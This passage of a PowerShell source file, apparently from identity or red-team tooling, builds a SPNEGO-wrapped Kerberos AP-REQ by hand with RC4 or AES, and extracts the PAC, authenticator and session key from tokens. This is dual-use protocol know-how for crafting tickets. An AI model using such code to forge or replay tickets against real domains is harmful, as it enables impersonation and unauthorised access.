                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x81))

                                                    # AdETypeNegotiation
                                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
                                                        Add-DERSequence -Data @(
                                                                #Add-DERInteger -Data @(0x12) # AES256_CTS_HMAC_SHA1_96
                                                                #Add-DERInteger -Data @(0x11) # AES128_CTS_HMAC_SHA1_96
                                                                Add-DERInteger -Data @(0x17) # RC4_HMAC_NT
                                                            )
                                                        )
                                                    )
                                                )
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D))
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            
                                                            Add-DERSequence -Data @(
                                                                Add-DERSequence -Data @(
                                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) #Restrictiontype = 0
                                                                    # Restrictions
                                                                        Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
                                                                            # Flags = Full
                                                                            @(0x00, 0x00, 0x00, 0x00)
                                                                            # Integritylevel = Low
                                                                            @(0x00, 0x10, 0x00, 0x00)
                                                                            # Machine Id
                                                                            $machineId
                                                                        )
                                                                    )
                                                                )
                                                            
                                                            )
                                                       )
                                                  )
                                             )
           
                                                Add-DERSequence -Data @(
                                                    # KerbLocal
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal2)
                                                    )
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8F))
                                            
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            # KerbApOptions = ChannelBindingSupported
                                                            @(0x00, 0x40, 0x00, 0x00)
                                                        )
                                                    )
                                                ) 
                                                    Add-DERSequence -Data @(
                                                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x90))
                                            
                                                        Add-DERTag -Tag 0xA1 -Data @(
                                                            # KerbServiceTarget
                                                            Add-DERUnicodeString -Text "$ServiceTarget@$Realm"
                                                        )
                                                    )
                                           )
                                      )
                                 )
                            )
                       )
                  )
             )
        )
        $encryptedAuthenticator = Encrypt-Kerberos -Data $authenticator -Key $SessionKey -Type Authenticator -Salt $AESSalt -Crypto $Crypto

        # NegTokenInit
        $kerberosTicket=Add-DERTag -Tag 0x60 -Data @(
            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.5.5.2" # SPNEGO
            Add-DERTag -Tag 0xA0 -Data @(
    
                Add-DERSequence -Data @(
                    # MechTypeList
                    Add-DERTag -Tag 0xA0 -Data @( # MechTypeList
                        Add-DERSequence -Data @(
                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.48018.1.2.2"    # Microsoft Kerberos OID
                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.30" # Negoex
                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.10" # NTLM
                        )
                    )
                    Add-DERTag -Tag 0xA2 -Data @( # MechToken
            

                        Add-DERTag -Tag 0x04 -Data @(
                            Add-DERTag -Tag 0x60 -Data @(# Application constructed object
                        
                                    Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
                                    Add-DERBoolean -Value $False
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Add-DERTag -Tag 0x6E -Data @(
                            Add-DERSequence -Data @(
                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) 
                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x0e)) 
                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x20, 0x00, 0x00, 0x00)) # KERB_VALINFO
                                Add-DERTag -Tag 0xA3 -Data @(
                            # AUTHENTICATOR
                                    Add-DERTag -Tag 0x61 -Data @(
                                        Add-DERSequence -Data @(
                                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) # AuthenticatorVersionNumber = 5
                                        Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm)
                                        Add-DERTag -Tag 0xA2 -Data @(
                                            Add-DERSequence -Data @(
                                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x02))
                                                Add-DERTag -Tag 0xA1 -Data @(
                                                    Add-DERSequence -Data @(
                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[0]
                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[1]
                                                    )
                                                )
                                            )
                                        )
                                        Add-DERTag -Tag 0xA3 -Data @(
                                            Add-DERSequence -Data @(
                                                if($Crypto -eq "RC4")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                                                }
                                                elseif($Crypto -eq "AES")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                                                }
                                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x05)) 
                                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedTicket)
                                               
                                            )
                                        )
                                
                                    )
                                 )
                    
                    
                    
                            )

                            Add-DERTag -Tag 0xA4 -Data @(
                                            Add-DERSequence -Data @(
                                                if($Crypto -eq "RC4")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                                                }
                                                elseif($Crypto -eq "AES")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                                                }
                                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedAuthenticator)

                                                
                                            )
                                        )
                                    )
                                )
                         
                            )
                        )
                    )
                )
            )
        )
        
        # Return
        $b64Ticket=[Convert]::ToBase64String([byte[]]$kerberosTicket)
        return $b64Ticket
    }
}


# Extracts PAC from the given Kerberos token
# Mar 26th 2021
function Get-PAC
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Token
    )
    Process
    {
        $parsedToken = Parse-Asn1 -Data $Token

        return $parsedToken.Data[1].Data.Data[1].Data.Data.Data[2].Data.Data[3].Data.Data.Data[3].Data.Data[2].Data.Data
    }
}

# Extracts Authenticator from the given Kerberos token
# Mar 26th 2021
function Get-Authenticator
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Token
    )
    Process
    {
        $parsedToken = Parse-Asn1 -Data $Token

        return $parsedToken.Data[1].Data.Data[1].Data.Data.Data[2].Data.Data[4].Data.Data[1].Data.Data
    }
}

# Parses PAC
# Mar 27th 2021
function Parse-PAC
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$PAC
    )
    Process
    {
        # PAC doesn't have "root" element, so let's add one
        $newData = Add-DERSequence -Data $PAC
        return Parse-Asn1 -Data $newData
    }
}

# Parses PAC
# Mar 27th 2021
function Parse-Authenticator
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Authenticator
    )
    Process
    {
        # Authenticator doesn't have "root" element, so let's add one
        $newData = Add-DERSequence -Data $Authenticator
        return Parse-Asn1 -Data $newData
    }
}

# Gets the sessionkey from PAC
# Mar 26th 2021
function Get-SessionKeyFromPAC
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$PAC
    )
    Process
    {
        $parsedPAC = Parse-PAC -PAC $PAC

        return $parsedPAC.Data.Data.Data[1].Data.Data[1].Data.Data
    }
}